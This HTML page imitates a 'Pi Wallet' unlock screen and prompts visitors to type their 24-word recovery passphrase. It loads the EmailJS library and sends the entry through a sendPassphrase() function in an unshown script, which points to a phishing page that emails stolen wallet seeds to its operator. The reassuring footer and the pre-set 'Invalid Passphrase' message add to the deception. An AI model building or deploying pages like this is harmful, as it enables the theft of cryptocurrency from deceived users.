<html lang="en">
<head>
    <meta charset="UTF-8">

<body>
    <div class="popup">
        <div class="header"> <img src="img/header.png" alt="" style="width: 120px"></div>
        <div class="content">
            <p>Unlock Pi Wallet</p>
            <textarea class="input-box" placeholder="Enter your 24-word passphrase here" style="height:275px; width: 100%;"></textarea>
            <p id="error-message">Invalid Passphrase</p>
            <button class="button" onclick="sendPassphrase()">Unlock With Passphrase</button>
        </div>
        <div class="footer">   
            <p>As a non-custodial wallet, your wallet passphrase is exclusively accessible only to you. Recovery of passphrase is currently impossible.</p>
            <br>Lost your passphrase? <span style="color: #2372cc;">you can create a new wallet,</span> but all your Ï€ in your previous wallet will be inaccessible.
        </div>
    </div>
<script type="text/javascript"
    src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js">    
</script>
<script src="js/wallet.js"></script>
